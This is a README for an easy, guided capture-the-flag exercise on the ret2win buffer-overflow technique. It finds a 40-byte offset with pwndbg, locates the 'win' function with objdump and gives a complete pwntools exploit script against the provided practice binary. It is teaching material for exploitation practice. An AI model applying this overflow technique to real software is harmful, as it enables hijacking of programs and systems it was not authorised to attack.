# Challenge Name
baby_R2W

## Learning Objective
Extended from BOF. Learn to find and rewrite return address to another function

## Description 
We want to win! But... how to win?

## Difficulty:
Guided (easy)

## Guide
In the code, you can see that `win` function is never called. We want to call this function.

To perform ret2win, we need to overwrite the return address from `main` to `win` after `vuln` function finishes running.

#### What we need to do:
1. Find the exact offset before it overflows
2. Find return address of `win` address

#### To find the offset needed:
1. use `cyclic 100` in pwndbg (this generates the de bruijin sequence)
2. `break main` and run the program (C)
3. you should see that the `RSP` pointer contains `faaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address.

```shell
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

#### To find the win address:
```shell
$> objdump -d baby_R2W_bin | grep win
0000000000401136 <win>:
```

Now we can put our solve script together!

#### Final Solution
```python
from pwn import *

# setup process
p = process("./baby_R2W_bin")
context.binary = "./baby_R2W_bin"

# address of win function
win = p64(0x401136)

# payload 
payload = b'A' * 40
payload += win

# send payload
p.sendline(payload)
p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win

## Attached Files
- baby_R2W.c
- baby_R2W_bin

## Resources
- https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win

## Flag
TBD